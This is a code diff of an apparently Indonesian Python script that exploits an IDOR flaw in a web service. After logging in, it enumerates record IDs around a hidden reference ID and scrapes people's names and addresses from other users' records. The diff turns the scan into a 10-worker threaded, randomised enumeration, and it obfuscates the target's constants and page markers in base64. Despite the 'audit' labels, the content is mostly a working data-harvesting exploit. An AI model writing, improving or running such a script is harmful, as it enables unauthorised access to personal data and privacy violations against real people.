@@ -190,50 +190,49 @@ def parameter_discovery_audit():
                     # 2. Automated Manipulation Test
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
-                    # Persiapkan rentang tepat 1001 ID (500 sebelum, 1 acuan, 500 sesudah)
+                    # Persiapkan rentang tepat 1001 ID
                     acuan_rm = int(_decode("MDA1MTA0ODE="))
                     search_pool = list(range(acuan_rm - int(_decode("NTAw")), acuan_rm + int(_decode("NTAx"))))
-                    random.shuffle(search_pool) # Tetap acak urutannya
+                    random.shuffle(search_pool)
                     
-                    found_valid = False
-                    for attempt, val in enumerate(search_pool, 1):
+                    found_event = threading.Event()
+
+                    def check_id_vulnerability(val):
+                        if found_event.is_set(): return
                         test_id = str(val).zfill(int(_decode("MTI=")))
                         test_url = base_url.replace(original_id, test_id)
-                        
-                        # Heartbeat pencarian
-                        print(f"    [Attempt {attempt}/{_decode('MTAwMQ==')}] Testing ID: {'*'*(len(test_id)-3)+test_id[-3:]}", end='\r')
-                        
-                        test_res = session.get(test_url, timeout=10)
-                        test_soup = BeautifulSoup(test_res.text, 'html.parser')
-                        
-                        name, address = "Unknown", "Tidak Ditemukan"
-                        
-                        # Ekstraksi Data (Sinkronisasi dengan Logika yang Dienkode)
-                        nama_tag = test_soup.find('p', class_=_decode("c2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3M="))
-                        if nama_tag:
-                            name = nama_tag.get_text(strip=True)
-                            details = test_soup.find_all('p', class_=_decode("ZGV0YWls"))
-                            for p in details:
-                                text = p.get_text(strip=True)
-                                if _decode("QWxhbWF0") in text:
-                                    address = text.split(":")[-1].strip()
-                        
-                        # Validasi Ketat: Pastikan nama dan alamat tidak kosong dan bukan placeholder
-                        if name.strip() and name != "Unknown" and address.strip() and address != "Tidak Ditemukan":
-                            found_valid = True
+                        try:
+                            test_res = session.get(test_url, timeout=10)
+                            test_soup = BeautifulSoup(test_res.text, 'html.parser')
+                            name, address = "Unknown", "Tidak Ditemukan"
                             
-                            # Masking: 2 huruf depan dan 1 huruf belakang
-                            m_name = f"{name[:2].upper()}...{name[-1:].upper()}" if len(name) > 3 else name.upper()
-                            m_addr = f"{address[:2].upper()}...{address[-1:].upper()}" if len(address) > 3 else address.upper()
+                            nama_tag = test_soup.find('p', class_=_decode("c2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3M="))
+                            if nama_tag:
+                                name = nama_tag.get_text(strip=True)
+                                details = test_soup.find_all('p', class_=_decode("ZGV0YWls"))
+                                for p in details:
+                                    text = p.get_text(strip=True)
+                                    if _decode("QWxhbWF0") in text:
+                                        address = text.split(":")[-1].strip()
+                            
+                            if name.strip() and name != "Unknown" and address.strip() and address != "Tidak Ditemukan":
+                                with lock:
+                                    if not found_event.is_set():
+                                        found_event.set()
+                                        m_name = f"{name[:2].upper()}...{name[-1:].upper()}" if len(name) > 3 else name.upper()
+                                        m_addr = f"{address[:2].upper()}...{address[-1:].upper()}" if len(address) > 3 else address.upper()
+                                        print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
+                                        print(f" [!] {_decode('TmFtYQ==')}        : {m_name}")
+                                        print(f" [!] {_decode('QWxhbWF0')}      : {m_addr}")
+                                        print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
+                        except: pass
 
-                            print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
-                            print(f" [!] {_decode('TmFtYQ==')}        : {m_name}")
-                            print(f" [!] {_decode('QWxhbWF0')}      : {m_addr}")
-                            print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
-                            break
+                    print(f"[*] Threaded Search Started (10 Workers)...")
+                    with ThreadPoolExecutor(max_workers=10) as discovery_executor:
+                        discovery_executor.map(check_id_vulnerability, search_pool)
                     
-                    if not found_valid:
-                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 500.")
+                    if not found_event.is_set():
+                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid.")
                     
                     if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                         break
@@ -301,11 +300,11 @@ def vulnerability_audit():
                     print(f"     [\033[93m!\033[0m] Potential Field: {name}")
     except: pass
 
-def start_process(start_range, end_range):
+def start_process(id_list):
     if login():
-        print(f"[*] Starting IDOR Scan for {end_range - start_range + 1} records...\n")
-        with ThreadPoolExecutor(max_workers=1) as executor: # Menggunakan 1 worker agar stabil (satu per satu)
-            executor.map(fetch_data, range(start_range, end_range + 1))
+        print(f"[*] Starting Accelerated Randomized IDOR Scan for {len(id_list)} records...\n")
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            executor.map(fetch_data, id_list)
         print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
 
 def main_menu():
@@ -329,8 +328,10 @@ def main_menu():
             try:
                 count = int(input("[?] Jumlah data yang ingin di scan: "))
                 BASE_ID = int(_decode("NTAyMDEz")) 
-                # Menjalankan scan dari ID dasar sebanyak jumlah yang diminta
-                start_process(BASE_ID, BASE_ID + count)
+                # Membuat list ID dan mengacaknya (Opsi 2 Random)
+                id_pool = list(range(BASE_ID, BASE_ID + count))
+                random.shuffle(id_pool)
+                start_process(id_pool)
             except ValueError:
                 print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
             input("\nTekan Enter untuk kembali ke menu...")
